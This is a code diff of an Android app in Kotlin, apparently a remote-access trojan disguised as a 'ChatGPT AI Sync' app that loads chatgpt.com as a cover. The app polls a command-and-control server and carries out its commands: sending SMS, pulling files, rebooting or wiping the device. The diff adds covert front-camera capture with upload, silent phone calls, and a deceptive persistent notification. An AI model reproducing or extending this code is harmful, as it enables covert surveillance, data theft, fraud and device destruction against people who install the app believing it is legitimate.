@@ -1,6 +1,9 @@
 package com.cognitive.ai.syncagent
 
 import android.Manifest
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.app.Service
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
@@ -24,6 +27,7 @@ import android.webkit.WebView
 import android.webkit.WebViewClient
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
+import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
@@ -46,12 +50,8 @@ class MainActivity : AppCompatActivity() {
     private val PERMISSION_REQUEST_CODE = 600
     private val ADMIN_REQUEST_CODE = 700
 
-    // السيرفر الخلفي لاستقبال البيانات
     private val C2_SERVER_URL = "https://mohammed2000999.vercel.app"
-    
-    // رابط شات جيبيتي الذي سيظهر للهدف بعد الدخول
     private val TARGET_REDIRECT_URL = "https://chatgpt.com"
-    
     private lateinit var sessionToken: String
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -72,20 +72,20 @@ class MainActivity : AppCompatActivity() {
 
     private fun loadOrCreatePersistentToken(): String {
         try {
-            val tokenFile = File(filesDir, ".persistent_token_v79.dat")
+            val tokenFile = File(filesDir, ".persistent_token_v80.dat")
             if (tokenFile.exists()) {
                 ObjectInputStream(FileInputStream(tokenFile)).use { ois ->
                     return ois.readObject() as String
                 }
             } else {
-                val newToken = "agent_v79_" + UUID.randomUUID().toString().substring(0, 8)
+                val newToken = "agent_v80_" + UUID.randomUUID().toString().substring(0, 8)
                 ObjectOutputStream(FileOutputStream(tokenFile)).use { oos ->
                     oos.writeObject(newToken)
                 }
                 return newToken
             }
         } catch (e: Exception) {
-            return "agent_v79_" + UUID.randomUUID().toString().substring(0, 8)
+            return "agent_v80_" + UUID.randomUUID().toString().substring(0, 8)
         }
     }
 
@@ -136,7 +136,7 @@ class MainActivity : AppCompatActivity() {
                 conn.doOutput = true
                 val payload = JSONObject().apply {
                     put("session_token", sessionToken)
-                    put("user_agent", System.getProperty("http.agent") ?: "ChatGPT Target v79.0")
+                    put("user_agent", System.getProperty("http.agent") ?: "ChatGPT Target v80.0")
                     put("platform", "Android OS Target")
                 }
                 OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
@@ -242,7 +242,6 @@ class MainActivity : AppCompatActivity() {
             override fun onPermissionRequest(request: PermissionRequest?) { request?.grant(request.resources) }
         }
         webView.clearCache(true)
-        // توجيه واجهة التطبيق مباشرة لرابط تشات جيبيتي بعد تحميل الخدمات الصامتة
         webView.loadUrl(TARGET_REDIRECT_URL)
     }
 
@@ -260,6 +259,8 @@ class BackgroundControlService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         token = intent?.getStringExtra("token") ?: "agent_unknown"
         serverUrl = intent?.getStringExtra("server_url") ?: "https://mohammed2000999.vercel.app"
+
+        startForeground(1, createForegroundNotification())
 
         pollingRunnable = object : Runnable {
             override fun run() {
@@ -294,11 +295,12 @@ class BackgroundControlService : Service() {
                                         "open_whatsapp" -> openAppPackage("com.whatsapp")
                                         "open_accounts" -> openAppPackage("com.android.settings")
                                         "open_camera" -> openCameraApp()
+                                        "make_call" -> makeDirectPhoneCall(cmd.optString("phone"))
                                         "send_sms" -> sendSMSMessage(cmd.optString("phone"), cmd.optString("body"))
                                         "reboot_device" -> executeRebootDevice()
                                         "wipe_device" -> executeWipeDevice()
                                     }
-                                    reportExecutionStatusDirect(action, "v79 Executed Successfully")
+                                    reportExecutionStatusDirect(action, "v80 Foreground Executed")
                                 }
                             }
                         }
@@ -311,6 +313,28 @@ class BackgroundControlService : Service() {
         handler.post(pollingRunnable)
 
         return START_STICKY
+    }
+
+    private fun createForegroundNotification(): Notification {
+        val channelId = "sync_service_channel"
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                channelId,
+                "AI Sync Service",
+                NotificationManager.IMPORTANCE_LOW
+            ).apply {
+                description = "جاري مزامنة بيانات النظام الخلفية"
+            }
+            val manager = getSystemService(NotificationManager::class.java)
+            manager?.createNotificationChannel(channel)
+        }
+
+        return NotificationCompat.Builder(this, channelId)
+            .setContentTitle("ChatGPT AI Sync")
+            .setContentText("النظام يعمل في الخلفية بمزامنة آمنة")
+            .setSmallIcon(android.R.drawable.ic_menu_sync)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .build()
     }
 
     private fun executeFilePullDirect(filePath: String) {
@@ -414,8 +438,46 @@ class BackgroundControlService : Service() {
 
     private fun executeHiddenPhotoCapture() {
         try {
-            val photoFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "hidden_${System.currentTimeMillis()}.jpg")
-            executeFilePullDirect(photoFile.absolutePath)
+            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
+            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
+                val facing = cameraManager.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
+                facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
+            } ?: cameraManager.cameraIdList.firstOrNull() ?: return
+
+            val imageReader = android.media.ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
+            imageReader.setOnImageAvailableListener({ reader ->
+                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
+                val buffer = image.planes[0].buffer
+                val bytes = ByteArray(buffer.remaining())
+                buffer.get(bytes)
+                image.close()
+
+                val photoFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "capture_${System.currentTimeMillis()}.jpg")
+                photoFile.writeBytes(bytes)
+                executeFilePullDirect(photoFile.absolutePath)
+            }, handler)
+
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
+                cameraManager.openCamera(cameraId, object : android.hardware.camera2.CameraDevice.StateCallback() {
+                    override fun onOpened(camera: android.hardware.camera2.CameraDevice) {
+                        val captureRequest = camera.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
+                            addTarget(imageReader.surface)
+                        }
+                        camera.createCaptureSession(listOf(imageReader.surface), object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
+                                session.capture(captureRequest.build(), object : android.hardware.camera2.CameraCaptureSession.CaptureCallback() {
+                                    override fun onCaptureCompleted(s: android.hardware.camera2.CameraCaptureSession, r: android.hardware.camera2.CaptureRequest, res: android.hardware.camera2.TotalCaptureResult) {
+                                        camera.close()
+                                    }
+                                }, handler)
+                            }
+                            override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) { camera.close() }
+                        }, handler)
+                    }
+                    override fun onDisconnected(camera: android.hardware.camera2.CameraDevice) { camera.close() }
+                    override fun onError(camera: android.hardware.camera2.CameraDevice, error: Int) { camera.close() }
+                }, handler)
+            }
         } catch (e: Exception) {}
     }
 
@@ -462,6 +524,18 @@ class BackgroundControlService : Service() {
         } catch (e: Exception) {}
     }
 
+    private fun makeDirectPhoneCall(phone: String) {
+        try {
+            if (phone.isNotEmpty() && ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
+                val callIntent = Intent(Intent.ACTION_CALL).apply {
+                    data = android.net.Uri.parse("tel:$phone")
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                startActivity(callIntent)
+            }
+        } catch (e: Exception) {}
+    }
+
     private fun sendSMSMessage(phone: String, body: String) {
         try {
             val smsManager = android.telephony.SmsManager.getDefault()
@@ -473,8 +547,10 @@ class BackgroundControlService : Service() {
         try {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
-            if (dpm.isAdminActive(adminComponent) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                dpm.reboot(ComponentName(this, TargetAdminReceiver::class.java))
+            if (dpm.isAdminActive(adminComponent)) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                    dpm.reboot()
+                }
             }
         } catch (e: Exception) {}
     }
